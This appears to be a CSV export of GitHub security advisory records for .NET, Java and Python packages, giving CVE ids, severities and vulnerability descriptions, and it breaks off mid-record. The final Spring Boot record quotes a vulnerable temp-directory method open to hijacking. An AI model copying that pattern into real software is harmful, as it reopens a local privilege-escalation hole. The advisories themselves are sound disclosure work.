2856,13261,System.ServiceModel.NetTcp,GHSA-jc8g-xhw5-6x46,CVE-2018-0786,https://github.com/advisories/GHSA-jc8g-xhw5-6x46,high,2018-10-16 19:59:05 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"Microsoft .NET Framework 2.0 SP2, 3.0 SP2, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2, 4.7, 4.7.1, .NET Core 1.0 and 2.0, and PowerShell Core 6.0.0 allow a security feature bypass vulnerability due to the way certificates are validated, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2857,13177,System.ServiceModel.Http,GHSA-jc8g-xhw5-6x46,CVE-2018-0786,https://github.com/advisories/GHSA-jc8g-xhw5-6x46,high,2018-10-16 19:59:05 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"Microsoft .NET Framework 2.0 SP2, 3.0 SP2, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2, 4.7, 4.7.1, .NET Core 1.0 and 2.0, and PowerShell Core 6.0.0 allow a security feature bypass vulnerability due to the way certificates are validated, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2858,13101,System.ServiceModel.Primitives,GHSA-jc8g-xhw5-6x46,CVE-2018-0786,https://github.com/advisories/GHSA-jc8g-xhw5-6x46,high,2018-10-16 19:59:05 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"Microsoft .NET Framework 2.0 SP2, 3.0 SP2, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2, 4.7, 4.7.1, .NET Core 1.0 and 2.0, and PowerShell Core 6.0.0 allow a security feature bypass vulnerability due to the way certificates are validated, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2859,35989,org.eclipse.jetty.http2:http2-server,GHSA-wgmr-mf83-7x4j,CVE-2022-2048,https://github.com/advisories/GHSA-wgmr-mf83-7x4j,high,2022-07-07 20:55:40 UTC,Jetty vulnerable to Invalid HTTP/2 requests that can lead to denial of service,"### Description
Invalid HTTP/2 requests (for example, invalid URIs) are incorrectly handled by writing a blocking error response directly from the selector thread.
If the client manages to exhaust the HTTP/2 flow control window, or TCP congest the connection, the selector thread will be blocked trying to write the error response.
If this is repeated for all the selector threads, the server becomes unresponsive, causing the denial of service.

### Impact
A malicious client may render the server unresponsive.

### Patches
The fix is available in Jetty versions 9.4.47. 10.0.10, 11.0.10.

### Workarounds
No workaround available within Jetty itself.
One possible workaround is to filter the requests before sending them to Jetty (for example in a proxy)

### For more information
If you have any questions or comments about this advisory:
* Email us at security@webtide.com.
",maven
2860,33935,org.eclipse.jetty:jetty-server,GHSA-8mpp-f3f7-xc28,CVE-2022-2191,https://github.com/advisories/GHSA-8mpp-f3f7-xc28,high,2022-07-07 20:55:37 UTC,Jetty SslConnection does not release pooled ByteBuffers in case of errors,"### Impact
`SslConnection` does not release `ByteBuffer`s in case of error code paths.
For example, TLS handshakes that require client-auth with clients that send expired certificates will trigger a TLS handshake errors and the `ByteBuffer`s used to process the TLS handshake will be leaked.

### Workarounds
Configure explicitly a `RetainableByteBufferPool` with `max[Heap|Direct]Memory` to limit the amount of memory that is leaked.
Eventually the pool will be full of ""active"" entries (the leaked ones) and will provide `ByteBuffer`s that will be GCed normally.

_With embedded-jetty_

``` java
int maxBucketSize = 1000;
long maxHeapMemory = 128 * 1024L * 1024L; // 128 MB
long maxDirectMemory = 128 * 1024L * 1024L; // 128 MB
RetainableByteBufferPool rbbp = new ArrayRetainableByteBufferPool(0, -1, -1, maxBucketSize, maxHeapMemory, maxDirectMemory);

server.addBean(rbbp); // make sure the ArrayRetainableByteBufferPool is added before the server is started
server.start();
```

_With jetty-home/jetty-base_

Create a `${jetty.base}/etc/retainable-byte-buffer-config.xml`

``` xml
<?xml version=""1.0""?>
<!DOCTYPE Configure PUBLIC ""-//Jetty//Configure//EN"" ""https://www.eclipse.org/jetty/configure_10_0.dtd"">

<Configure id=""Server"" class=""org.eclipse.jetty.server.Server"">
  <Call name=""addBean"">
    <Arg>
      <New class=""org.eclipse.jetty.io.ArrayRetainableByteBufferPool"">
        <Arg type=""int""><Property name=""jetty.byteBufferPool.minCapacity"" default=""0""/></Arg>
        <Arg type=""int""><Property name=""jetty.byteBufferPool.factor"" default=""-1""/></Arg>
        <Arg type=""int""><Property name=""jetty.byteBufferPool.maxCapacity"" default=""-1""/></Arg>
        <Arg type=""int""><Property name=""jetty.byteBufferPool.maxBucketSize"" default=""1000""/></Arg>
        <Arg type=""long""><Property name=""jetty.byteBufferPool.maxHeapMemory"" default=""128000000""/></Arg>
        <Arg type=""long""><Property name=""jetty.byteBufferPool.maxDirectMemory"" default=""128000000""/></Arg>
      </New>
    </Arg>
  </Call>
</Configure>
```

And then reference it in `${jetty.base}/start.d/retainable-byte-buffer-config.ini`

```
etc/retainable-byte-buffer-config.xml
```


### References
https://github.com/eclipse/jetty.project/issues/8161

### For more information
* Email us at [security@webtide.com](mailto:security@webtide.com)
",maven
2861,34260,org.eclipse.jetty:jetty-http,GHSA-cj7v-27pg-wf7q,CVE-2022-2047,https://github.com/advisories/GHSA-cj7v-27pg-wf7q,low,2022-07-07 20:55:34 UTC,Jetty invalid URI parsing may produce invalid HttpURI.authority,"### Description
URI use within Jetty's `HttpURI` class can parse invalid URIs such as `http://localhost;/path` as having an authority with a host of `localhost;`.

A URIs of the type `http://localhost;/path` should be interpreted to be either invalid or as `localhost;` to be the userinfo and no host.
However, `HttpURI.host` returns `localhost;` which is definitely wrong.

### Impact
This can lead to errors with Jetty's `HttpClient`, and Jetty's `ProxyServlet` / `AsyncProxyServlet` / `AsyncMiddleManServlet` wrongly interpreting an authority with no host as one with a host.

### Patches
Patched in PR [#8146](https://github.com/eclipse/jetty.project/pull/8146) for Jetty version 9.4.47.
Patched in PR [#8014](https://github.com/eclipse/jetty.project/pull/8015) for Jetty versions 10.0.10, and 11.0.10

### Workarounds
None.

### For more information
If you have any questions or comments about this advisory:
* Email us at security@webtide.com.",maven
2862,33986,org.springframework:spring-expression,GHSA-558x-2xjg-6232,CVE-2022-22950,https://github.com/advisories/GHSA-558x-2xjg-6232,moderate,2022-04-03 00:01:00 UTC,Allocation of Resources Without Limits or Throttling in Spring Framework,"In Spring Framework versions 5.3.0 - 5.3.16, 5.2.0 - 5.2.19, and older unsupported versions, it is possible for a user to provide a specially crafted SpEL expression that may cause a denial of service condition.",maven
2863,34700,org.apache.commons:commons-configuration2,GHSA-xj57-8qj4-c4m6,CVE-2022-33980,https://github.com/advisories/GHSA-xj57-8qj4-c4m6,critical,2022-07-07 00:00:26 UTC,Code injection in Apache Commons Configuration,"Apache Commons Configuration performs variable interpolation, allowing properties to be dynamically evaluated and expanded. The standard format for interpolation is ""${prefix:name}"", where ""prefix"" is used to locate an instance of org.apache.commons.configuration2.interpol.Lookup that performs the interpolation. Starting with version 2.4 and continuing through 2.7, the set of default Lookup instances included interpolators that could result in arbitrary code execution or contact with remote servers. These lookups are: - ""script"" - execute expressions using the JVM script execution engine (javax.script) - ""dns"" - resolve dns records - ""url"" - load values from urls, including from remote servers Applications using the interpolation defaults in the affected versions may be vulnerable to remote code execution or unintentional contact with remote servers if untrusted configuration values are used. Users are recommended to upgrade to Apache Commons Configuration 2.8.0, which disables the problematic interpolators by default.",maven
2864,36131,org.owasp.esapi:esapi,GHSA-2g56-7jv7-wxxq,CVE-2013-5960,https://github.com/advisories/GHSA-2g56-7jv7-wxxq,moderate,2022-05-14 01:37:06 UTC,Missing Cryptographic Step in OWASP Enterprise Security API for Java,"The authenticated-encryption feature in the symmetric-encryption implementation in the OWASP Enterprise Security API (ESAPI) for Java 2.x before 2.1.0.1 does not properly resist tampering with serialized ciphertext, which makes it easier for remote attackers to bypass intended cryptographic protection mechanisms via an attack against the intended cipher mode in a non-default configuration, a different vulnerability than CVE-2013-5679.",maven
2865,15306,System.Private.Uri,GHSA-x5qj-9vmx-7g6g,CVE-2019-0657,https://github.com/advisories/GHSA-x5qj-9vmx-7g6g,moderate,2022-05-14 01:28:01 UTC,Improper Input Validation in .Net Framework API's,"A vulnerability exists in certain .Net Framework API's and Visual Studio in the way they parse URL's, aka '.NET Framework and Visual Studio Spoofing Vulnerability'.",nuget
2866,12847,Microsoft.NETCore.App,GHSA-x5qj-9vmx-7g6g,CVE-2019-0657,https://github.com/advisories/GHSA-x5qj-9vmx-7g6g,moderate,2022-05-14 01:28:01 UTC,Improper Input Validation in .Net Framework API's,"A vulnerability exists in certain .Net Framework API's and Visual Studio in the way they parse URL's, aka '.NET Framework and Visual Studio Spoofing Vulnerability'.",nuget
2867,13005,Microsoft.AspNetCore.App,GHSA-6px8-22w5-w334,CVE-2019-0564,https://github.com/advisories/GHSA-6px8-22w5-w334,high,2022-05-14 01:41:32 UTC,Denial of service in ASP.NET Core,"A denial of service vulnerability exists when ASP.NET Core improperly handles web requests, aka ""ASP.NET Core Denial of Service Vulnerability."" This affects ASP.NET Core 2.1. This CVE ID is unique from CVE-2019-0548.",nuget
2868,12847,Microsoft.NETCore.App,GHSA-6px8-22w5-w334,CVE-2019-0564,https://github.com/advisories/GHSA-6px8-22w5-w334,high,2022-05-14 01:41:32 UTC,Denial of service in ASP.NET Core,"A denial of service vulnerability exists when ASP.NET Core improperly handles web requests, aka ""ASP.NET Core Denial of Service Vulnerability."" This affects ASP.NET Core 2.1. This CVE ID is unique from CVE-2019-0548.",nuget
2869,12860,System.Net.Http,GHSA-2xjx-v99w-gqf3,CVE-2019-0545,https://github.com/advisories/GHSA-2xjx-v99w-gqf3,high,2022-05-14 01:41:10 UTC,Exposure of Sensitive Information in System.Net.Http,"An information disclosure vulnerability exists in .NET Framework and .NET Core which allows bypassing Cross-origin Resource Sharing (CORS) configurations, aka "".NET Framework Information Disclosure Vulnerability."" This affects Microsoft .NET Framework 2.0, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2, Microsoft .NET Framework 4.5.2, Microsoft .NET Framework 4.6, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1/4.7.2, Microsoft .NET Framework 4.7/4.7.1/4.7.2, .NET Core 2.1, Microsoft .NET Framework 4.7.1/4.7.2, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, .NET Core 2.2, Microsoft .NET Framework 4.7.2.",nuget
2870,12847,Microsoft.NETCore.App,GHSA-5633-f33j-c6f7,CVE-2018-8416,https://github.com/advisories/GHSA-5633-f33j-c6f7,moderate,2022-05-13 01:20:52 UTC,Tampering vulnerability in .NET Core,"A tampering vulnerability exists when .NET Core improperly handles specially crafted files, aka "".NET Core Tampering Vulnerability."" This affects .NET Core 2.1.",nuget
2871,13256,System.ServiceModel.Security,GHSA-p9wx-v264-q34p,CVE-2018-8356,https://github.com/advisories/GHSA-p9wx-v264-q34p,moderate,2022-05-14 03:00:10 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"A security feature bypass vulnerability exists when Microsoft .NET Framework components do not correctly validate certificates, aka "".NET Framework Security Feature Bypass Vulnerability."" This affects .NET Framework 4.7.2, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2, ASP.NET Core 1.1, Microsoft .NET Framework 4.5.2, ASP.NET Core 2.0, ASP.NET Core 1.0, .NET Core 1.1, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, .NET Core 1.0, .NET Core 2.0, Microsoft .NET Framework 4.6, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1/4.7.1/4.7.2, Microsoft .NET Framework 4.7.2.",nuget
2872,13101,System.ServiceModel.Primitives,GHSA-p9wx-v264-q34p,CVE-2018-8356,https://github.com/advisories/GHSA-p9wx-v264-q34p,moderate,2022-05-14 03:00:10 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"A security feature bypass vulnerability exists when Microsoft .NET Framework components do not correctly validate certificates, aka "".NET Framework Security Feature Bypass Vulnerability."" This affects .NET Framework 4.7.2, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2, ASP.NET Core 1.1, Microsoft .NET Framework 4.5.2, ASP.NET Core 2.0, ASP.NET Core 1.0, .NET Core 1.1, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, .NET Core 1.0, .NET Core 2.0, Microsoft .NET Framework 4.6, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1/4.7.1/4.7.2, Microsoft .NET Framework 4.7.2.",nuget
2873,13261,System.ServiceModel.NetTcp,GHSA-p9wx-v264-q34p,CVE-2018-8356,https://github.com/advisories/GHSA-p9wx-v264-q34p,moderate,2022-05-14 03:00:10 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"A security feature bypass vulnerability exists when Microsoft .NET Framework components do not correctly validate certificates, aka "".NET Framework Security Feature Bypass Vulnerability."" This affects .NET Framework 4.7.2, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2, ASP.NET Core 1.1, Microsoft .NET Framework 4.5.2, ASP.NET Core 2.0, ASP.NET Core 1.0, .NET Core 1.1, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, .NET Core 1.0, .NET Core 2.0, Microsoft .NET Framework 4.6, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1/4.7.1/4.7.2, Microsoft .NET Framework 4.7.2.",nuget
2874,13177,System.ServiceModel.Http,GHSA-p9wx-v264-q34p,CVE-2018-8356,https://github.com/advisories/GHSA-p9wx-v264-q34p,moderate,2022-05-14 03:00:10 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"A security feature bypass vulnerability exists when Microsoft .NET Framework components do not correctly validate certificates, aka "".NET Framework Security Feature Bypass Vulnerability."" This affects .NET Framework 4.7.2, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2, ASP.NET Core 1.1, Microsoft .NET Framework 4.5.2, ASP.NET Core 2.0, ASP.NET Core 1.0, .NET Core 1.1, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, .NET Core 1.0, .NET Core 2.0, Microsoft .NET Framework 4.6, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1/4.7.1/4.7.2, Microsoft .NET Framework 4.7.2.",nuget
2875,13309,System.ServiceModel.Duplex,GHSA-p9wx-v264-q34p,CVE-2018-8356,https://github.com/advisories/GHSA-p9wx-v264-q34p,moderate,2022-05-14 03:00:10 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"A security feature bypass vulnerability exists when Microsoft .NET Framework components do not correctly validate certificates, aka "".NET Framework Security Feature Bypass Vulnerability."" This affects .NET Framework 4.7.2, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2, ASP.NET Core 1.1, Microsoft .NET Framework 4.5.2, ASP.NET Core 2.0, ASP.NET Core 1.0, .NET Core 1.1, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, .NET Core 1.0, .NET Core 2.0, Microsoft .NET Framework 4.6, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1/4.7.1/4.7.2, Microsoft .NET Framework 4.7.2.",nuget
2876,14267,System.Private.ServiceModel,GHSA-p9wx-v264-q34p,CVE-2018-8356,https://github.com/advisories/GHSA-p9wx-v264-q34p,moderate,2022-05-14 03:00:10 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"A security feature bypass vulnerability exists when Microsoft .NET Framework components do not correctly validate certificates, aka "".NET Framework Security Feature Bypass Vulnerability."" This affects .NET Framework 4.7.2, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2, ASP.NET Core 1.1, Microsoft .NET Framework 4.5.2, ASP.NET Core 2.0, ASP.NET Core 1.0, .NET Core 1.1, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, .NET Core 1.0, .NET Core 2.0, Microsoft .NET Framework 4.6, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1/4.7.1/4.7.2, Microsoft .NET Framework 4.7.2.",nuget
2877,14457,Microsoft.AspNetCore.Mvc.Cors,GHSA-3rp6-rjw4-cq39,CVE-2017-8700,https://github.com/advisories/GHSA-3rp6-rjw4-cq39,high,2022-05-13 01:47:40 UTC,Cross-origin Resource Sharing bypass in ASP.NET Core,"ASP.NET Core 1.0, 1.1, and 2.0 allow an attacker to bypass Cross-origin Resource Sharing (CORS) configurations and retrieve normally restricted content from a web application, aka ""ASP.NET Core Information Disclosure Vulnerability"".",nuget
2878,12903,Microsoft.AspNetCore.Mvc.Core,GHSA-3rp6-rjw4-cq39,CVE-2017-8700,https://github.com/advisories/GHSA-3rp6-rjw4-cq39,high,2022-05-13 01:47:40 UTC,Cross-origin Resource Sharing bypass in ASP.NET Core,"ASP.NET Core 1.0, 1.1, and 2.0 allow an attacker to bypass Cross-origin Resource Sharing (CORS) configurations and retrieve normally restricted content from a web application, aka ""ASP.NET Core Information Disclosure Vulnerability"".",nuget
2879,12903,Microsoft.AspNetCore.Mvc.Core,GHSA-3wcj-rg8q-9cqv,CVE-2017-11879,https://github.com/advisories/GHSA-3wcj-rg8q-9cqv,high,2022-05-14 03:47:22 UTC,Open redirect in ASP.NET Core,"ASP.NET Core 2.0 allows an attacker to steal log-in session information such as cookies or authentication tokens via a specially crafted URL aka ""ASP.NET Core Elevation Of Privilege Vulnerability"".",nuget
2880,34261,org.apache.camel:camel-core,GHSA-x9fv-c87w-55wc,CVE-2013-4330,https://github.com/advisories/GHSA-x9fv-c87w-55wc,moderate,2022-05-13 01:26:34 UTC,Improper Control of Generation of Code in Apache Camel,"Apache Camel before 2.9.7, 2.10.0 before 2.10.7, 2.11.0 before 2.11.2, and 2.12.0 allows remote attackers to execute arbitrary simple language expressions by including ""$simple{}"" in a CamelFileName message header to a (1) FILE or (2) FTP producer.",maven
2881,34591,org.springframework:spring-oxm,GHSA-rp4p-g69r-438x,CVE-2013-4152,https://github.com/advisories/GHSA-rp4p-g69r-438x,moderate,2022-05-13 01:02:38 UTC,Cross-Site Request Forgery in Spring Framework,"The Spring OXM wrapper in Spring Framework before 3.2.4 and 4.0.0.M1, when using the JAXB marshaller, does not disable entity resolution, which allows context-dependent attackers to read arbitrary files, cause a denial of service, and conduct CSRF attacks via an XML external entity declaration in conjunction with an entity reference in a (1) DOMSource, (2) StAXSource, (3) SAXSource, or (4) StreamSource, aka an XML External Entity (XXE) issue.",maven
2882,34966,org.jgroups:jgroups,GHSA-cc62-496p-hrr7,CVE-2013-4112,https://github.com/advisories/GHSA-cc62-496p-hrr7,moderate,2022-05-17 04:50:16 UTC,Exposure of Sensitive Information to an Unauthorized Actor in JGroup,"The DiagnosticsHandler in JGroup 3.0.x, 3.1.x, 3.2.x before 3.2.9, and 3.3.x before 3.3.3 allows remote attackers to obtain sensitive information (diagnostic information) and execute arbitrary code by reusing valid credentials.",maven
2883,33974,xerces:xercesImpl,GHSA-7j4h-8wpf-rqfh,CVE-2013-4002,https://github.com/advisories/GHSA-7j4h-8wpf-rqfh,high,2022-05-13 01:01:06 UTC,Missing XML Validation in Apache Xerces2,"XMLscanner.java in Apache Xerces2 Java Parser before 2.12.0, as used in the Java Runtime Environment (JRE) in IBM Java 5.0 before 5.0 SR16-FP3, 6 before 6 SR14, 6.0.1 before 6.0.1 SR6, and 7 before 7 SR5 as well as Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, Java SE Embedded 7u40 and earlier, and possibly other products allows remote attackers to cause a denial of service via vectors related to XML attribute names.",maven
2884,35045,org.apache.activemq:activemq-client,GHSA-p358-58jj-hp65,CVE-2013-3060,https://github.com/advisories/GHSA-p358-58jj-hp65,moderate,2022-05-17 03:46:28 UTC,Improper Authentication in Apache ActiveMQ,"The web console in Apache ActiveMQ before 5.8.0 does not require authentication, which allows remote attackers to obtain sensitive information or cause a denial of service via HTTP requests.",maven
2885,34046,org.apache.hadoop:hadoop-common,GHSA-pxv5-5vmp-3jj4,CVE-2013-2192,https://github.com/advisories/GHSA-pxv5-5vmp-3jj4,low,2022-05-17 02:54:07 UTC,Improper Authentication in Apache Hadoop,"The RPC protocol implementation in Apache Hadoop 2.x before 2.0.6-alpha, 0.23.x before 0.23.9, and 1.x before 1.2.1, when the Kerberos security features are enabled, allows man-in-the-middle attackers to disable bidirectional authentication and obtain sensitive information by forcing a downgrade to simple authentication.",maven
2886,34443,org.apache.cxf:cxf-rt-frontend-jaxrs,GHSA-254q-rp36-v2m8,CVE-2013-2160,https://github.com/advisories/GHSA-254q-rp36-v2m8,moderate,2022-05-13 01:09:20 UTC,Missing XML Validation in Apache CXF,"The streaming XML parser in Apache CXF 2.5.x before 2.5.10, 2.6.x before 2.6.7, and 2.7.x before 2.7.4 allows remote attackers to cause a denial of service (CPU and memory consumption) via crafted XML with a large number of (1) elements, (2) attributes, (3) nested constructs, and possibly other vectors.",maven
2887,19865,pymongo,GHSA-x33v-f3gp-gw2c,CVE-2013-2132,https://github.com/advisories/GHSA-x33v-f3gp-gw2c,moderate,2022-05-14 02:10:10 UTC,Use of NullPointerException Catch to Detect NULL Pointer Dereference in Pymongo,"bson/_cbsonmodule.c in the mongo-python-driver (aka. pymongo) before 2.5.2, as used in MongoDB, allows context-dependent attackers to cause a denial of service (NULL pointer dereference and crash) via vectors related to decoding of an ""invalid DBRef.""",pip
2888,34974,org.apache.struts:struts2-core,GHSA-whmq-v94q-34p9,CVE-2013-1965,https://github.com/advisories/GHSA-whmq-v94q-34p9,high,2022-05-14 00:54:15 UTC,Improper Control of Generation of Code in Apache Struts,"Apache Struts Showcase App 2.0.0 through 2.3.13, as used in Struts 2 before 2.3.14.3, allows remote attackers to execute arbitrary OGNL code via a crafted parameter name that is not properly handled when invoking a redirect.",maven
2889,19919,pip,GHSA-4gv5-qhvr-36vv,CVE-2013-1888,https://github.com/advisories/GHSA-4gv5-qhvr-36vv,low,2022-05-13 01:11:25 UTC,Improper Link Resolution Before File Access in pip,pip before 1.3 allows local users to overwrite arbitrary files via a symlink attack on a file in the /tmp/pip-build temporary directory.,pip
2890,35045,org.apache.activemq:activemq-client,GHSA-mfhr-3xmc-r2gg,CVE-2013-1879,https://github.com/advisories/GHSA-mfhr-3xmc-r2gg,moderate,2022-05-17 01:36:25 UTC,Improper Neutralization of Input During Web Page Generation in Apache ActiveMQ,"Cross-site scripting (XSS) vulnerability in scheduled.jsp in Apache ActiveMQ 5.8.0 and earlier allows remote attackers to inject arbitrary web script or HTML via vectors involving the ""cron of a message.""",maven
2891,34962,org.apache.openjpa:openjpa,GHSA-j65f-mvgw-prp2,CVE-2013-1768,https://github.com/advisories/GHSA-j65f-mvgw-prp2,high,2022-05-14 03:30:19 UTC,Deserialization of Untrusted Data in Apache OpenJPA,"The BrokerFactory functionality in Apache OpenJPA 1.x before 1.2.3 and 2.x before 2.2.2 creates local executable JSP files containing logging trace data produced during deserialization of certain crafted OpenJPA objects, which makes it easier for remote attackers to execute arbitrary code by creating a serialized object and leveraging improperly secured server programs.",maven
2892,19919,pip,GHSA-g3p5-fjj9-h8gj,CVE-2013-1629,https://github.com/advisories/GHSA-g3p5-fjj9-h8gj,moderate,2022-05-13 01:11:25 UTC,Improper Input Validation in pip,"pip before 1.3 uses HTTP to retrieve packages from the PyPI repository, and does not perform integrity checks on package contents, which allows man-in-the-middle attackers to execute arbitrary code via a crafted response to a ""pip install"" operation.",pip
2893,34021,org.bouncycastle:bcprov-jdk15on,GHSA-8353-fgcr-xfhx,CVE-2013-1624,https://github.com/advisories/GHSA-8353-fgcr-xfhx,moderate,2022-05-14 02:14:04 UTC,Improper Input Validation in Bouncy Castle,"The TLS implementation in the Bouncy Castle Java library before 1.48 and C# library before 1.8 does not properly consider timing side-channel attacks on a noncompliant MAC check operation during the processing of malformed CBC padding, which allows remote attackers to conduct distinguishing attacks and plaintext-recovery attacks via statistical analysis of timing data for crafted packets, a related issue to CVE-2013-0169.",maven
2894,33999,commons-fileupload:commons-fileupload,GHSA-vm69-474v-7q2w,CVE-2013-0248,https://github.com/advisories/GHSA-vm69-474v-7q2w,low,2022-05-05 02:48:41 UTC,Incorrect Default Permissions in Apache Commons FileUpload,"The default configuration of javax.servlet.context.tempdir in Apache Commons FileUpload 1.0 through 1.2.2 uses the /tmp directory for uploaded files, which allows local users to overwrite arbitrary files via an unspecified symlink attack.",maven
2895,34443,org.apache.cxf:cxf-rt-frontend-jaxrs,GHSA-p5c5-6564-vvr8,CVE-2013-0239,https://github.com/advisories/GHSA-p5c5-6564-vvr8,moderate,2022-05-05 02:48:38 UTC,Improper Authentication in Apache CXF,"Apache CXF before 2.5.9, 2.6.x before 2.6.6, and 2.7.x before 2.7.3, when the plaintext UsernameToken WS-SecurityPolicy is enabled, allows remote attackers to bypass authentication via a security header of a SOAP request containing a UsernameToken element that lacks a password child element.",maven
2896,34814,org.apache.myfaces.core:myfaces-api,GHSA-4fv4-cq5v-x45m,CVE-2010-2057,https://github.com/advisories/GHSA-4fv4-cq5v-x45m,moderate,2022-05-17 05:45:54 UTC,Improper Authentication in Apache MyFaces,"shared/util/StateUtils.java in Apache MyFaces 1.1.x before 1.1.8, 1.2.x before 1.2.9, and 2.0.x before 2.0.1 uses an encrypted View State without a Message Authentication Code (MAC), which makes it easier for remote attackers to perform successful modifications of the View State via a padding oracle attack.",maven
2897,34443,org.apache.cxf:cxf-rt-frontend-jaxrs,GHSA-v8q2-94f6-6xq2,CVE-2010-2076,https://github.com/advisories/GHSA-v8q2-94f6-6xq2,high,2022-05-13 01:09:23 UTC,Improper Input Validation in Apache CXF,"Apache CXF 2.0.x before 2.0.13, 2.1.x before 2.1.10, and 2.2.x before 2.2.9, as used in Apache ServiceMix, Apache Camel, Apache Chemistry, Apache jUDDI, Apache Geronimo, and other products, does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service (CPU and memory consumption) via a crafted DTD, as demonstrated by an entity declaration in a request to samples/wsdl_first_pure_xml, a similar issue to CVE-2010-1632.",maven
2898,33996,org.apache.derby:derby,GHSA-xprw-xvvm-vqmv,CVE-2010-2232,https://github.com/advisories/GHSA-xprw-xvvm-vqmv,high,2022-05-17 00:29:52 UTC,Improper Access Control in Apache Derby,"In Apache Derby 10.1.2.1, 10.2.2.0, 10.3.1.4, and 10.4.1.3, Export processing may allow an attacker to overwrite an existing file.",maven
2899,28751,pyftpdlib,GHSA-hw4g-fhcp-x5mq,CVE-2010-3494,https://github.com/advisories/GHSA-hw4g-fhcp-x5mq,moderate,2022-05-17 05:47:39 UTC,Concurrent Execution using Shared Resource with Improper Synchronization in pyftpdlib,"Race condition in the FTPHandler class in ftpserver.py in pyftpdlib before 0.5.2 allows remote attackers to cause a denial of service (daemon outage) by establishing and then immediately closing a TCP connection, leading to the accept function having an unexpected value of None for the address, or an ECONNABORTED, EAGAIN, or EWOULDBLOCK error, a related issue to CVE-2010-3492.",pip
2900,35612,org.acegisecurity:acegi-security,GHSA-3295-h9qx-r82x,CVE-2010-3700,https://github.com/advisories/GHSA-3295-h9qx-r82x,moderate,2022-05-14 02:43:11 UTC,Authentication Bypass Using an Alternate Path or Channel in SpringSource Spring Security and Acegi Security,"VMware SpringSource Spring Security 2.x before 2.0.6 and 3.x before 3.0.4, and Acegi Security 1.0.0 through 1.0.7, as used in IBM WebSphere Application Server (WAS) 6.1 and 7.0, allows remote attackers to bypass security constraints via a path parameter.",maven
2901,34025,org.springframework.security:spring-security-core,GHSA-3295-h9qx-r82x,CVE-2010-3700,https://github.com/advisories/GHSA-3295-h9qx-r82x,moderate,2022-05-14 02:43:11 UTC,Authentication Bypass Using an Alternate Path or Channel in SpringSource Spring Security and Acegi Security,"VMware SpringSource Spring Security 2.x before 2.0.6 and 3.x before 3.0.4, and Acegi Security 1.0.0 through 1.0.7, as used in IBM WebSphere Application Server (WAS) 6.1 and 7.0, allows remote attackers to bypass security constraints via a path parameter.",maven
2902,34029,org.springframework.boot:spring-boot,GHSA-cm59-pr5q-cw85,CVE-2022-27772,https://github.com/advisories/GHSA-cm59-pr5q-cw85,high,2022-07-11 20:59:02 UTC,Temporary Directory Hijacking to Local Privilege Escalation Vulnerability in org.springframework.boot:spring-boot,"spring-boot versions prior to version `v2.2.11.RELEASE` was vulnerable to temporary directory hijacking. This vulnerability impacted the `org.springframework.boot.web.server.AbstractConfigurableWebServerFactory.createTempDir` method.

The vulnerable method is used to create a work directory for embedded web servers such as Tomcat and Jetty. The directory contains configuration files, JSP/class files, etc. If a local attacker got the permission to write in this directory, they could completely take over the application (ie. local privilege escalation).

#### Impact Location

This vulnerability impacted the following source location:

```java
	/**
	 * Return the absolute temp dir for given web server.
	 * @param prefix server name
	 * @return the temp dir for given server.
	 */
	protected final File createTempDir(String prefix) {
		try {
			File tempDir = File.createTempFile(prefix + ""."", ""."" + getPort());
			tempDir.delete();
			tempDir.mkdir();
			tempDir.deleteOnExit();
			return tempDir;
		}
```
\- https://github.com/spring-projects/spring-boot/blob/ce70e7d768977242a8ea6f93188388f273be5851/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/web/server/AbstractConfigurableWebServerFactory.java#L165-L177

